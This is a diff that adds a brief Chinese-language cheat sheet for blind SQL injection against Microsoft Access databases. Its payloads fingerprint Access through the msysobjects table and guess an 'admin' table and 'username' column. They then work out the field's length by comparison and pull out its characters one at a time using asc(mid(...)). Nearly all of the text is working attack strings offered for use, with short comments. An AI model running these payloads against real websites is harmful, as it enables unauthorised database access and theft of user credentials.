@@ -1,0 +1,10 @@
+判断是否有注入就不说了
+and exists(select * from msysobjects) /*500状态码或报无权限读取代表是Access数据库*/
+and exists(select * from admin) /*admin是你要猜解的表名*/
+and exists(select username from admin) /*username是你要猜解的列名*/
+and (select top 1 len(username) from admin)>1 /*top 1 len(你要猜解列名的长度),1代表长度,直到报错的第一个*/
+例子：
+and (select top1 len(username) from admin)>4 /*正确*/
+and (select top 1 len(username) from admin)>5 /*错误*/ 那么长度为5，第一个错误就是长度
+
+and(select top 1 asc(mid(username,1,1))from admin)=97 /*username为你要猜解的列名，1为长度，如果上一步为5这里最高是5,97位ascii码,通过ascii来猜解字段*/
